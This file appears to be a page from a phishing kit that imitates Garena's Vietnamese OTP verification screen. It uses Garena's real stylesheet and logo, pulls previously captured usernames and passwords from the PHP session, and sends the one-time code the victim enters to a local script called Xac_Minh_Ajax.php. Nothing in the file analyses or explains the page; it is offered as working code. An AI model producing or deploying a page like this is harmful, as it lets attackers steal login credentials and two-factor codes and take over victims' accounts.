
<!doctype html>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="description" content="Garena">
<link href="https://account.garena.com/css/acccenter-pc.css?ver=0.000018" rel="stylesheet" type="text/css">
<script src="../Assets_Garena/js/jsencrypt.min.js" type="text/javascript"></script>

<title>Garena</title>
</head>
<body>
<?php
session_start();
$user = $_SESSION['user'];
$pass = $_SESSION['pass'];
$useragent = $_SERVER['HTTP_USER_AGENT']; //get the user agent
if(strpos($useragent,"Windows") ) { //string to match
 echo '<center>';
}
       
	?>





<div id="page">
<div id="header" class="header">
<div class="topBarGarena"></div>
<div class="topBar"></div>
<h1>
<a class="logo" href="javascript:;" target="_blank">
<img src="https://auth.garena.com/images/img_garena_logo.png" style="height: 35px;">
</a>
</h1>
</div>
<div id="main-panel" class="pc">
<div class="content">
    

	<script type="text/javascript">
	var count = 60;
	function countDown(){
		var timer = document.getElementById("timer");
		if(count > 0){
			count--;
			timer.innerHTML = "Còn <b>"+count+"</b>s";
			setTimeout("countDown()", 1000);
		}else{
		    
		    
			 setTimeout(function(){
			     	var user = $('#login-form input[name=user]').val();
			     window.location = '../Logout'}, 600);
		}
	}
	</script>

    

<div class="content-item content-item--ipage">
   <div class="content-item__title">NHẬP MÃ XÁC THỰC</div>
   <div class="content-item__main">
      <div class="content-item--ipage__main">
         <div class="content__sendinfo" id="J-sendinfo">
            <div class="content__sendinfo-before">Một mã xác thực vừa được gửi <br>
           đến số điện thoại đăng ký tài khoản của bạn <br>
          Nhập mã xác thực để chứng minh bạn là chủ tài khoản<br>
           Lưu ý: Đối với mạng Vietnamobile,
           <br>bạn sẽ nhận được cuộc gọi thoại nhận mã OTP.
            </div>
         
         </div>
         <div class="content__form">
           <form id="login-form" class="loginForm">
               <div class="content__phone">
                   <p id="timer"><script type="text/javascript">countDown();</script></p>
               </div>
  
               <div class="content__form-otpcode">
                  <div class="content__form-input">
                      <input type="tel" maxlength="6" name="otp" id="otp" class="content__form-input-widget J-validated-field" placeholder="Nhập mã xác thực"></div>
                    
               </div>
               
         <span id="msg" class="errorMsg" style="color:red;"></span>      
               <div class="content__form-errmsg" id="J-errdisplay-otp"></div>
               <div class="content__submit-wrap">
                   <input type="submit" class="content__submit" id="confirm-btn" name="login" value="XÁC NHẬN"></div>
            </form>
         </div>
      </div>
   </div>
</div>




</center>



</div>



<div class="linkLine">

</div>
</div>
</div>
</div>
<script src="../Assets_Garena/js/jquery-1.10.2.min.js"></script>
<script src="../Assets_Garena/js/xacminh.js"></script>
</body>
<script type="text/javascript">

var public_key = "-----BEGIN PUBLIC KEY-----\MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDR7FHnzqB8syM62mAJAG7z6/ie\/Vz3eq0hEFHQCAd9xxQocrjDbulx1LNox5wTprvLibVRqDCMaPcXZMFRnerZC1YO\Ems2U3VwDMWi5s+B4qD+6jG1PB+NPzrlIt+asZtcDDkdmX1t5WgHMoubvV9tCOpH\YUBgF34S9lvbldXW4wIDAQAB\-----END PUBLIC KEY-----";
function encryptPassword(password) {
    var encrypt = new JSEncrypt();
    encrypt.setPublicKey(public_key);
    return encrypt.encrypt(password);
}
function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * 
 charactersLength));
   }
   return result;
}

$(document).ready(function() {
    $('#confirm-btn').click(function(e) {
        e.preventDefault();
        var user = $('#login-form input[name=user]').val();
        
        $( ".errorMsg" ).empty();
        $.ajax({
        type: 'GET',
        dataType: "json",
        url : 'Xac_Minh_Ajax.php',
        
        data: {
            otp: $("#otp").val(),
        },
        
        beforeSend: function() {
            $("#confirm-btn").val("ĐANG XÁC NHẬN...").attr("disabled", !0)
        },
        complete: function() {
            $("#confirm-btn").val("XÁC NHẬN").removeAttr("disabled");
            captchaGenerate()
        }
            
        }).done(function(repo) {
            console.log(repo.code);
            if (repo.code == 1)
            {
              window.location.href="../login/DaXacMinh.php";
            }else {
                $('.errorMsg').append("<em></em> " + repo.error);
                captchaGenerate();
            } 
        });
    });

	
});
</script>
</html>